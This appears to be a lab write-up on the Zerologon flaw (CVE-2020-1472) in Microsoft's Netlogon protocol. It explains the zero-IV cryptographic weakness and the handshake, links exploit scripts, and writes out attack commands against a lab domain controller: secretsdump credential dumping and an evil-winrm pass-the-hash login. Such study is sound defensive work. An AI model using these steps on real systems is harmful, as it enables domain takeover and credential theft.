Zero Logon is a vulnerablity that abuses features with MS-NRPC. An attacker goes from zero to Domain admin in approximately one minute.

#### About The Vulnerability
Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC.
Based on Microsoft Netlogon Remote Protocol; a critical authentication component of AD (users and machines); attack focuses on poor implementation of cryptography. Microsoft uses AES-CFFB8 which has hardcoded IV as all 0s instead of random strings. So when an attacker sends a message containing all 0s there is a 1 in 256 chance that the ciphertext would be 0.


##### About Machine Accounts
Effective on machine accounts because when tried on user accounts, we get locked out. Because machine accounts have no predefined account lockout attempts because a 64+ character alpha-numeric password is used to secure them, making it diffiecult to break through

#### Abusing the Vulnerablity
Machine accounts hold system level privilege: <br />
`Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit`

#### Analyzing the MS-NRPC Logon Process
Lets see how Microsoft handles authentication to NRPC.
**Steps**
- Client creates NetrServerReqChallenge and sends it. The request contains the followig:
    - The Domain Controller
    - The Target device
    - A nonce (could be 16 bytes if zer0)
- The Server receives the NetrServerReqChallenge, generated its own nonce (server challenge) and sends the server challenge back
- Client compute it's NetLogon Credentials with the Server Challenge provided. Uses the NetrServerAuthenticate3 method. (requires; A custom binding handle, an account name, a secure channel type, the coomputer name, the cleint cred string, negotiation flags). Mimikatz gives us a buck load of the fake creds here.
- The server receives the NetrServerAuthenticate request and compute the same request itself using its known good values. If the results are good, the server sends the require info back to the client. 

Steps 4 and 3 are iterative; this is teh 1 in 256 chances
- if the server calculates the same value, the cleient will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key is used to encrypt communications btw the client and the server, which means authentication is successful. From here, normal RPC communications can occur.


### Proof of Concept
CVE by Secura https://github.com/SecuraBV/CVE-2020-1472
Download PoC from: https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
Modified code for exploit: https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py <br />
Exploit a vulnerable Domain Controller. <br />
Usage: <br />
![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/1.png) <br />

To get domain name: <br />
`└─$ crackmapexec smb 10.10.25.29 -u 'guest' -p ''                   1 ⨯`
![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/4.png) <br />

Running script against our vulnerable domain controller: <br />
![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/2.png) <br />
Now, to pull the secret off the target machine: <br />
`└─$ impacket-secretsdump -just-dc -no-pass DC01\$@10.10.25.29                                                                                                                                   130 ⨯
`
![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/5.png) <br />

Now we can pass the hash with winrmc: <br/>
`└─$ evil-winrm -i 10.10.25.29 -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568                                                                                                              130 ⨯
`
![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/6.png)
